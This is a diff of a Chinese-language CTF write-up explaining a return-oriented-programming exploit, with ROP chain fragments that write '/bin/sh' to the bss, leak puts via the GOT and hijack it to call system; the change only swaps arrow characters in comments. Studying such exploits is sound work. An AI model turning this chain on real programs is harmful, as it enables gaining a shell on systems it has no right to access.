@@ -61,7 +61,7 @@ int main(){
         ```
     3. 現在的問題有兩個，一個是我們要怎麼把==/bin/sh==送進去，因為如果直接看binary的gadget沒有`/bin/sh`或是`/sh`的string，不過我們可以直接用同樣的方法，把字串送進去
         ```python
-        # fetch user input -> /bin/sh\x00
+        # fetch user input → /bin/sh\x00
         pop_rdi_ret
         bss_addr
         gets_plt,
@@ -69,7 +69,7 @@ int main(){
         此時他就會像使用者要輸入，並把我們的輸入丟到bss address
     4. 另外一個問題就是我們要怎麼呼叫==system==，因為這個binary是動態的，代表一開始沒有link到system的話就不能直接呼叫，因此我們可以利用同樣的方法達到==got hijacking==
         ```python
-        # fetch user input -> system address
+        # fetch user input → system address
         pop_rdi_ret
         puts_got
         gets_plt
@@ -103,11 +103,11 @@ payload = flat(
     pop_rdi_ret,    puts_got,
     puts_plt,
 
-    # fetch user input -> /bin/sh\x00
+    # fetch user input → /bin/sh\x00
     pop_rdi_ret,    bss_addr,
     gets_plt,
 
-    # fetch user input -> system address
+    # fetch user input → system address
     pop_rdi_ret,    puts_got,
     gets_plt,
 
